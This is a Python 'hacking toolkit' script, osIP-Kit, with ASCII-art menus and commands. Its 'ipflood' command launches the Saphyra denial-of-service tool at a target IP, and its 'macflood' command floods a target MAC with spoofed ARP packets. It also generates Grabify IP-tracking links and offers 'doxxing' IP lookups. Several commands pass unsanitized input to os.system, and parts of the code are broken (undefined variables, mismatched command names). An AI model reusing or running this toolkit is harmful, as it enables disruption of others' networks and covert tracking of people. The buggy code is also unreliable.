############Made By Ahmad############$
# IMPORTS
import os
import socket
import threading
import socket as s
import sys
import random
import getpass
import string
import whois
import json
import urllib
from urllib.request import urlopen
import time
import requests
from scapy.all import *
from pyfiglet import figlet_format
from colorama import Fore, Style
# MENU
os.system("clear")
print ("""
[Welcome To The osIP Framework!]

(Zoom Out Completely For The Best CLI Experience)
Please Choose A CLI Theme:
-1- Drop The Blood Pyramid
-2- Swiss Army Knife
-3- Standard Logo
-4- Horizon
-5- Matrix
-6- Hack The World
-7- Anonymous
-8- CryEyes
""")
mmenu = input ("[*] Choose Theme: ")
os.system("clear")
print (Style.BRIGHT + Fore.RED +"W E L - C O M E ")
time.sleep(0.5)
print ("======================================")
menu8 = ("""


                ████████████              
            ████            ████          
          ██                    ██        
        ██                        ██      
      ██                            ██    
      ██                            ██    
    ██                                ██  
    ██                                ██  
    ██                                ██  
    ██    ██████            ██████    ██  
  ██    ████  ██████    ██████▒▒████    ██
  ██        ▒▒▓▓            ▓▓▒▒        ██
  ██  ▒▒▒▒  ▒▒▒▒            ▓▓▒▒  ▒▒▒▒  ██
  ██  ▒▒▒▒  ▒▒▓▓            ▒▒▒▒  ▒▒▒▒  ██
  ██  ▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒  ██
    ██    ████████████████████████    ██  
    ██      ████████████████████      ██  
      ██    ████████████████████    ██    
      ██      ████████████████      ██    
        ██      ▒▒▒▒▒▒▒▒▒▒▒▒      ██      
          ██                    ██        
            ████            ████          
                ████████████              
                                   [Say Cheese ;)]
---------------------------------------------------------------------------------------------------

""")
menu7 = ("""
---------------------------------------------------------------------------------------------------
                        ░░░░░░░░░░░░░░░░░░░░░░                    
                ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░              
            ░░░░░░░░      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒        
        ░░░░░░░░                  ░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒    
      ░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒  
    ░░░░░░░░░░░░░░                  ░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒  
    ░░░░░░░░░░░░░░░░░░              ░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒
    ░░░░░░  ░░        ░░            ░░  ░░░░░░░░░░▒▒▒▒▒▒░░░░▒▒▒▒▒▒
  ░░░░░░░░▓▓██▓▓▒▒░░░░  ░░              ░░▒▒▓▓▓▓██▓▓▓▓▓▓██▓▓▒▒▒▒▒▒
    ░░▒▒░░░░░░░░▒▒▒▒░░░░░░          ░░████████░░░░░░░░░░░░░░▒▒▒▒▒▒
  ░░░░░░░░        ░░▒▒▓▓▓▓          ▓▓██▒▒░░  ░░░░░░░░░░░░░░▒▒▒▒▒▒
  ▒▒░░░░            ░░░░▓▓          ▓▓░░░░    ░░░░  ░░░░░░░░▒▒▒▒▒▒
  ▒▒░░░░              ░░░░          ░░░░      ░░░░░░░░░░░░░░▒▒▒▒▒▒
  ▒▒░░░░░░            ░░░░        ░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒
  ░░░░░░░░░░    ░░░░░░░░          ░░░░░░░░░░▓▓██████▓▓░░░░▒▒▒▒▒▒▒▒
  ░░░░░░░░▒▒██████████░░          ░░░░░░████████████████░░▒▒▒▒▒▒▒▒
  ░░░░░░░░██████████▓▓▓▓          ░░░░░░██████████████▓▓░░░░░░▒▒▒▒
  ░░░░░░░░░░▓▓██▓▓▒▒░░            ░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒
  ░░░░░░░░░░░░░░░░                ░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒
  ░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒
  ░░░░░░░░░░░░                  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒
  ░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓
  ░░░░░░░░░░                      ░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▓▓
  ░░░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒
  ░░░░░░░░░░░░  ░░░░░░            ░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒  
    ░░░░░░░░░░░░                  ░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒░░▒▒  
    ▒▒  ▒▒▒▒░░        ░░          ░░░░░░░░░░░░░░░░░░░░░░██░░▒▒▒▒  
    ▒▒░░░░██░░          ░░░░░░  ░░░░▒▒░░░░░░░░░░░░░░░░▓▓▓▓░░▒▒▒▒  
    ░░░░░░▓▓▒▒            ░░██▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░▒▒██▒▒░░▒▒    
    ░░░░  ░░██▒▒      ░░▒▒▓▓▓▓▒▒░░▓▓▓▓▓▓░░░░░░░░░░▓▓██▒▒▒▒▒▒▒▒    
      ░░░░  ░░▓▓▓▓▓▓▒▒▓▓▓▓▒▒▓▓░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░▒▒░░▒▒▒▒    
      ░░░░  ░░░░▓▓▓▓▓▓▓▓▓▓▓▓░░    ░░██▒▒▓▓▓▓▓▓▒▒░░░░▒▒░░▒▒▒▒      
      ░░░░░░  ░░    ░░░░██▒▒▒▒▒▒▒▒▓▓▓▓▓▓░░░░░░░░░░▒▒░░░░▒▒▒▒      
        ░░░░░░  ░░░░              ░░░░░░░░░░░░▒▒▒▒▒▒░░▒▒▒▒        
          ░░░░░░░░░░░░░░░░          ░░░░░░▒▒░░▒▒▒▒░░▒▒▒▒          
              ░░░░░░░░░░    ▒▒▓▓▓▓██▒▒░░░░░░░░▒▒░░▒▒▒▒            
              ░░░░░░░░░░░░░░  ██████░░░░░░░░▒▒░░▒▒▒▒              
                ░░░░░░░░      ▓▓██▓▓░░░░░░░░▒▒▒▒▒▒▒▒              
                  ░░░░░░░░  ░░▓▓████░░░░░░░░▒▒▒▒▒▒                
                    ░░░░░░░░░░▓▓██▓▓░░░░░░▒▒▒▒░░                  
                      ░░░░░░░░██████░░░░░░▒▒                      
                        ░░░░░░▓▓████▒▒░░▒▒                        
                          ░░░░▒▒████▒▒▒▒                          
                              ░░██▓▓░░                            

                               [We Are Anonymous]
---------------------------------------------------------------------------------------------------
""")
menu6 = ("""
 ===============================
|        [Hack The World]       |
|                               |
|xxxx.IP.xxxx.DNS.xxxx.MAC.xxxx.|
|xxxx.DOX.xxxx.BRUTEFORCE.xxxx. |
|xxxx.DORK.xxxx.SQL.xxxx.MALWARE|
|xxxx.DUCKY.xxxx.GITHUB.xxxx.   |
|MITM.xxxx.KALI.xxxx.SSH.xxxx.  |
|                               |
 ===============================
""")
menu4 = ("""
---------------------------------
*            *   *      *     _//
     *         *    *      * / \\
  *       *  *      *        \\_/
    *          *     *      
 *             *         *
*     *   *        *      
the horizon

###hack the world ###### ########
#################################
#################################
#################################
---------------------------------
""")
menu3 = ("osIP-KIT")
menu2 = ("""

           
          /
         /**
        /****  ~`osIP-Kit`~
       /******
      /********
     /**********
    /************
   /drop the blood
   •–––––––––––––––•
""")
menu = ("""
        .-..
       / | \\
       |---||     ~`'osIP-Kit'`~
       |---||
       |---||
   .---^ - ^---..
   : O S I P   ::
   : T - K I T ::
   :___________::
      |  |//||
      |  |//||
      |  |//||
      |  |//||
      |  |//||
      |  |//||
      |  |.-||
      |.-'**||
      \*****//
       \***//
        \*//
         V/

        ' '
         ^'
        (_)
        
  Hack The World
        """)
if mmenu == "1":
	print (menu2)
if mmenu == "2":
	print (menu)
if mmenu == "3":
	print (menu3)
if mmenu == "4":
	print (menu4)
if mmenu == "5":
	os.system("clear")
	print (Style.BRIGHT + Fore.GREEN +"MATRIX")
	print ("""
-------------------------------
0 1 0 1 0 0 1 1 0 1 1 1 1 0 1 1
1 0 1 1 1 0 0 1 0 1 0 0 1 0 1 0
1 0 0 1 I ❤ MATRIX 0 1 0 1 1 0 1
0 1 1 0 1 0 1 0 1 0 1 0 1 0 0 1
0 1 0 0 1 0 0 1 0 0 1 0 1 0 1 0
--------------------------------
Fun Fact: I Was Inspired By The Matrix <3
""")
if mmenu == "6":
	print (menu6)
if mmenu == "7":
	print (menu7)
if mmenu == "8":
	print (menu8)
time.sleep(0.5)
creditss = ("""######################################
Made By Ahmad
Replit: @AhmadTheWeirdo
YouTube: Black Magic
Type Help To See All Commands
######################################""")
print (creditss)
time.sleep(0.5)
# VARIABLES
value = random.uniform(1, 999999)
choice = input("[*] ")
ping = ""
ipflood = ""
# COMMANDS
def cxode(length=6):
	charset = string.ascii_letters+string.digits
	return''.join(random.choice(charset) for i in range (length))
def ask():
  choice = input("[*] ")
if choice == "ping":
    ipp = input("[*] Enter The IP Address/Hostname That You Want To Ping: ")
    os.system("ping "+ipp)
    ask()
elif choice == "gen":
	for i in range(500):
		code = cxode(6)
		print ("https://grabify.link/track/"+code)
		ask()
elif choice == "ipflood":
	print ("[*] Please Note: Due To Anonymous Making The Saphyra Tool Ages Ago Its Made In Python 2 So Python 2 Is Required!, Forgot To Mention Saphyra Requires A Good Device Because It Sends A Attack Signal To 5k Useragents Which Makes The Device Lag!")
	ipdos = input("[*] Input Target's IP Address:  ")
	os.system("python2 saphyra.py "+ipdos)
elif choice == "nmap":
	nmapip = input("[*] Enter The IP You Want To Check: ")
	os.system("nmap "+nmapip)
	ask()
elif choice == "help":
	print ("""
 -------------------------------
|           H E L P             |
| ----------------------------- |
| install - install the modules |
| req - install the python reqs |
| checkua - posts all useragents|
| nmap - checks ip for vulns    |
| iplookup - doxxes ip          |
| ipflood - sends packets to ip |
| macfl - sends packets to mac  |
| ping - tests if server is ok  |
| request - same as ping        |
| ncat - reverseshell host      |
| ssh - sshs into clients pc    |
| compile - compile file to exe |
| clear - clears screen (unix)  |
| gen - generates grabify codes |
| credits - posts credits       |
 -------------------------------
	""")
	ask()
elif choice == "request":
	rserver = input("[*] Enter Server: ")
	done = False
	r=requests.get(rserver).status_code
	done = True
	if done == True:
		if status_code == "404":
			print ("Website Forbidden")
		if status_code == "200":
			print ("Website Is Up!")
		if status_code == "410":
			print ("Website Is Deleted")
		ask()
elif choice == "checkua":
	os.system("clear")
	os.system("curl https://raw.githubusercontent.com/laorynas/Saphyra/master/lists/useragents.txt")
	ask()
elif choice == "exit":
	print ("[*] Thanks For Using osIP-Kit. <3")
	exit()
elif choice == "compile":
	os.system("pyinstaller --onefile main.py")
	ask()
elif choice == "ssh":
	print ("example: kali@192.168.0.0")
	ipssh = input("[*] Enter The SSH Client's Username: ")
	os.system("ssh "+ipssh)
	ask()
elif choice == "req":
	os.system("sudo pip3 install scapy pyfiglet colorama pyfiglet requests pyinstaller")
elif choice == "credits":
	print ("""
	Made By Ahmad
	Made For Educational Purposes Only/ Penetration Testing
	""")
	ask()
elif choice == "install":
	print ("[*] Installing...")
	done = False
	os.system("sudo apt-get nmap netcat python2")
	ask()
	ask()
	if done == True:
		print ("[*] Restarting Device...")
		os.system("sudo reboot")
		ask()
elif choice == "iplookup":
	ippp = input("[*] Input IP Address: ")
	w = whois(ippp)
	print (w)
	ask()
elif choice == "macflood":
    while 1:
    	sendp(Ether(src=RandMAC(),dst=input("[*] Enter The Target's Mac Address: ")/ARP(op=2, psrc="0.0.0.0", hwdst=input("[*] Enter Your Mac Address: "))/Padding(load="X"*18)))
    	ask()
elif choice == "ncat":
	iplisten = input("[*] Enter The IP Listener: ")
	os.system("nc -l "+iplisten)
	ask()
elif choice == "clear":
	os.system("clear")
	print (creditss)
	ask()
else:
	ask()
ask()
